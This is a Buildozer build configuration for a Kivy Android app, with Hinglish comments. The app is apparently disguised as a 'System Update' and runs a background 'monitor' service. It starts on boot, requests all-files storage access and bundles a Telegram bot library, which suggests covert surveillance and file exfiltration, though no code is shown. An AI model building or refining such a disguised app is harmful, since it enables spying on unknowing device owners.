[app]

# (str) Title of your application
title = System Update

# (str) Package name
package.name = sysupdate

# (str) Package domain
package.domain = org.vajra.pro

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 2.0

# (list) Application requirements
# Yahan 'android' requirement zaroori hai permissions handle karne ke liye
requirements = python3,kivy==2.3.0,pyTelegramBotAPI,requests,certifi,chardet,idna,urllib3,android

# (list) Supported orientations
orientation = portrait

# (list) List of service to declare
# Isse app background mein active rahegi
services = monitor:main.py

#
# Android specific
#

# (bool) Fullscreen or not
fullscreen = 0

# (list) Permissions 
# MANAGE_EXTERNAL_STORAGE Android 11-16 ke liye "All Files Access" deta hai
android.permissions = INTERNET, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, FOREGROUND_SERVICE_DATA_SYNC

# (int) Target Android API (API 34 = Android 14, supports up to 16)
android.api = 34

# (int) Minimum API your APK will support
android.minapi = 21

# (int) Android SDK version to use
android.sdk = 34

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True)
android.private_storage = True

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

# (str) The Android archs to build for
# Isme 64-bit support hona zaroori hai naye phones ke liye
android.archs = arm64-v8a, armeabi-v7a

# (bool) enables Android auto backup feature
android.allow_backup = True

# (str) The format used to package the app
android.debug_artifact = apk

# (list) List of Java .jar files to add
# Naye Android versions ke liye zaroori meta-data
android.meta_data = com.google.android.gms.permission.AD_ID=false

[buildozer]

# (int) Log level (2 = debug info)
log_level = 2

# (int) Display warning if buildozer is run as root
warn_on_root = 0

